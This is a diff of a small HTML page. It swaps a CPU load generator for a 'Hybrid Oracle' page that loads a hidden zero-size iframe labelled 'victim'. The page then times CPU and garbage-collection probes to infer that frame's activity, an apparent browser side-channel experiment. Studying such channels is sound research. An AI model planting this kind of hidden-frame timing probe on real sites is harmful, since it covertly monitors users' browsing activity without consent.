@@ -1,32 +1,65 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>CPU Storm</title>
+<title>Hybrid Oracle</title>
+
+<h2>Hybrid Side-Channel (Scheduler + GC)</h2>
+<pre id="log"></pre>
+
+<iframe src="/spoof/victim.html" style="width:0;height:0;border:0"></iframe>
 
 <script>
-let mode = 0
-
-setInterval(() => {
-  mode ^= 1
-}, 2000)
-
-function burn(ms) {
-  const end = performance.now() + ms
-  while (performance.now() < end) {}
+const log = m => {
+  document.getElementById('log').textContent += m + "\n"
+  console.log(m)
 }
 
-function heavyWork() {
-  for (let i = 0; i < 10; i++) {
-    burn(20)
+// ===== PROBE CPU =====
+function cpuProbe() {
+  const t0 = performance.now()
+  let x = 0
+  for (let i = 0; i < 4e6; i++) x += i
+  return performance.now() - t0
+}
+
+// ===== PROBE GC =====
+function gcProbe() {
+  const t0 = performance.now()
+  let arr = []
+  for (let i = 0; i < 20000; i++) {
+    arr.push([i])
+  }
+  return performance.now() - t0
+}
+
+// ===== HYBRID =====
+function measure() {
+  const cpu = cpuProbe()
+  const gc = gcProbe()
+
+  return {
+    cpu,
+    gc,
+    total: cpu + gc
   }
 }
 
+let history = []
+
 setInterval(() => {
-  if (mode === 0) {
-    // LOW
-    burn(10)
-  } else {
-    // HIGH (brutal)
-    heavyWork()
-  }
-}, 50)
+  const {cpu, gc, total} = measure()
+
+  history.push(total)
+  if (history.length > 20) history.shift()
+
+  const avg = history.reduce((a,b)=>a+b,0)/history.length
+
+  let state = "LOW"
+  if (total > avg * 1.5) state = "MEDIUM"
+  if (total > avg * 2.2) state = "HIGH 🔥"
+
+  log(
+    `cpu=${cpu.toFixed(2)} gc=${gc.toFixed(2)} total=${total.toFixed(2)} => ${state}`
+  )
+
+}, 150)
 </script>
